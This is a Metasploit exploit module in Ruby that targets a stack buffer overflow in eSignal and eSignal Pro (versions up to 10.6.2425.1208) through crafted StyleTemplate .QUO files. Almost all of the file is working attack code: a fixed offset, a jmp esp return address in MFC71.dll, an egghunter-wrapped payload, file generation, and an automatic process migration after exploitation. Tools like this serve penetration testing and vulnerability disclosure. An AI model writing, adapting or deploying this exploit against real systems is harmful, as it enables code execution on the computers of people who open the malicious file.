# $Id: esignal_styletemplate_bof.rb 13765 2011-09-20 17:39:53Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;eSignal and eSignal Pro <= 10.6.2425.1208 file parsing buffer overflow in QUO&#039;,
            &#039;Description&#039;    => %q{
                The software is unable to handle the "<StyleTemplate>" files (even
                those original included in the program) like those with the registered
                extensions QUO, SUM and POR. Successful exploitation of this vulnerability
                may take up to several seconds due to the use of egghunter.  Also, DEP
                bypass is unlikely due to the limited space for payload.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;,                          # Original discovery
                    &#039;TecR0c <tecr0c[at]tecninja.net>&#039;,         # msf
                    &#039;mr_me <steventhomasseeley[at]gmai.com>&#039;,  # msf
                ],
            &#039;Version&#039;       => &#039;$Revision: 13765 $&#039;,
            &#039;References&#039;    =>
                [
                    #[ &#039;CVE&#039;, &#039;?&#039; ],
                    #[ &#039;OSVDB&#039;, &#039;?&#039; ],
                    [ &#039;BID&#039;, &#039;49600&#039; ],
                    [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/esignal_1-adv.txt&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17837/&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00"
                },
 
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Win XP SP3 / Windows Vista / Windows 7&#039;,
                        {
                            &#039;Ret&#039;     =>  0x7c206fef, # jmp esp MFC71.dll v10.6.2425.1208
                            &#039;Offset&#039;  =>  54
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Sep 06 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.quo&#039;]),
            ], self.class)
 
    end
 
    def exploit
        eggoptions =
        {
            :checksum => false,
            :eggtag => &#039;eggz&#039;
        }
 
        hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        buffer =  rand_text_alpha(target[&#039;Offset&#039;])
        buffer << [target.ret].pack(&#039;V&#039;)
        buffer << rand_text_alpha_upper(4)
        buffer << hunter
        buffer << rand_text_alpha_upper(1500)
        buffer << egg
 
        file = "<StyleTemplate>\r\n"
        file << "#{buffer}\r\n"
        file << "</StyleTemplate>\r\n"
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(file)
    end
end



